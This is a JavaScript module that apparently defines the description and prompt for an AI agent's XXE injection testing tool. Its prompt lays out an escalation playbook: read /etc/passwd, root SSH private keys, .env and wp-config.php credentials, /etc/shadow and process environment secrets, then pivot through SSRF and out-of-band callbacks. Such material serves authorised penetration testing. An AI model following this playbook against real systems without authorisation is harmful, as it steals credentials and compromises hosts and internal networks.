import { XXE_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `XML External Entity (XXE) injection tester — detects out-of-band, error-based, blind, billion-laughs, and SVG-upload XXE vulnerabilities.`

export const PROMPT = `## ${XXE_TOOL_NAME} — XML External Entity Injection → LFI → Internal Pivot

### ESCALATION RULE — XXE is only useful if you read sensitive files and pivot:
1. action=detect → confirm XML parsing accepts external entities
2. action=file_read file_path=/etc/passwd → confirm LFI works
3. action=file_read file_path=/proc/net/tcp → decode hex IPs to map internal network
4. Read sensitive files: /root/.ssh/id_rsa, /home/*/.ssh/id_rsa, app config files (.env, wp-config.php, database.yml)
5. action=ssrf → probe internal services discovered in /proc/net/tcp
Goal: SSH keys, database credentials, or internal service access. XXE detection alone is not a complete finding.

### High-value file targets (read these in order after detection):
- /etc/passwd — user enumeration
- /proc/net/tcp — internal network map (decode hex: e.g. 0100007F = 127.0.0.1)
- /root/.ssh/id_rsa — root SSH private key (direct login if exposed)
- /var/www/html/.env, /var/www/html/config.php, /var/www/html/wp-config.php — DB credentials
- /opt/app/application.yml, /opt/app/application.properties — Spring Boot credentials
- /etc/shadow — password hashes (requires root-level parse)
- /proc/self/environ — current process environment variables (API keys, secrets)
- /home/<user>/.bash_history — command history with credentials

### Actions
- \`detect\` — inject basic XXE payloads to detect if XML parsing is vulnerable
- \`file_read\` — attempt to read local files via XXE (e.g. /etc/passwd)
- \`ssrf\` — trigger SSRF via XXE external entity pointing to attacker-controlled URL
- \`oob\` — out-of-band XXE using DNS/HTTP callback (requires oob_url)
- \`billion_laughs\` — test for entity expansion DoS (safe version, limited expansion)
- \`svg\` — SVG-wrapped XXE for image-upload endpoints that rasterize SVG (send with content_type image/svg+xml)

### Input
- \`url\`: target URL that accepts XML
- \`action\`: type of XXE test
- \`oob_url\`: OOB callback URL (for oob action, e.g. Burp Collaborator URL)
- \`file_path\`: file to read (for file_read, default: /etc/passwd)
- \`content_type\`: request content type (default: application/xml)
- \`data_template\`: XML template with INJECT placeholder for the entity reference
- \`timeout_secs\`: timeout in seconds (default: 30)

### Examples
- \`{ url: "https://target.com/api/xml", action: "detect" }\`
- \`{ url: "https://target.com/api/xml", action: "file_read", file_path: "/etc/passwd" }\`
- \`{ url: "https://target.com/api/xml", action: "file_read", file_path: "/proc/net/tcp" }\`
- \`{ url: "https://target.com/api/xml", action: "file_read", file_path: "/proc/self/environ" }\`
- \`{ url: "https://target.com/api/xml", action: "oob", oob_url: "http://callback.burpcollaborator.net" }\`
- \`{ url: "https://target.com/upload/avatar", action: "svg", file_path: "/etc/passwd" }\`
`
